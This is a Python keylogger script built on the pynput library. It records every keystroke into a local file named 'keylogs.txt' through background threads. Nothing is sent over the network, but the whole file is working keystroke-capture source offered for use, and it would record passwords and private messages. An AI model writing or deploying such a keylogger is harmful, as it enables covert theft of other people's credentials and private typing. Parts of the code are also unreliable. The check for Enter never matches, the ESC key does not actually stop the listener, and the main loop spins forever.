import threading
from pynput import keyboard

class KeyLogger:
    def __init__(self, log_file='keylogs.txt'):
        self.log_file = log_file
        self.log = ""
        self.running = False
        self.lock = threading.Lock()

    def on_press(self, key):
        try:
            # Try to capture the key name
            key_name = key.char
            if key_name:
                self._add_to_log(key_name)
        except AttributeError:
            # Handle special keys (e.g., Enter, Backspace)
            key_name = str(key).replace("'", "")
            self._add_to_log(key_name)

    def on_release(self, key):
        # Stop listener on certain key release events
        if key == keyboard.Key.esc:
            self.stop()

    def _add_to_log(self, key_name):
        with self.lock:
            self.log += key_name
            if key_name == 'Enter':  # New line for each Enter key press
                self.log += '\n'

    def _write_log_to_file(self):
        while self.running:
            with self.lock:
                if self.log:
                    with open(self.log_file, 'a') as f:
                        f.write(self.log)
                    self.log = ""
            threading.Event().wait(0.1)  # sleep momentarily to prevent tight loop

    def start(self):
        self.running = True
        # Start key listener in a separate thread
        listener_thread = threading.Thread(target=self._run_listener)
        listener_thread.daemon = True
        listener_thread.start()

        # Start log writer thread for file I/O
        log_writer_thread = threading.Thread(target=self._write_log_to_file)
        log_writer_thread.daemon = True
        log_writer_thread.start()

    def stop(self):
        self.running = False

    def _run_listener(self):
        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()

def main():
    key_logger = KeyLogger()
    print("Press ESC to stop logging.")
    key_logger.start()

    # Keep the main thread alive to listen for the listener to finish
    while True:
        try:
            pass  # Main thread can perform other tasks here
        except KeyboardInterrupt:
            print("Exiting...")
            key_logger.stop()
            break

if __name__ == "__main__":
    main()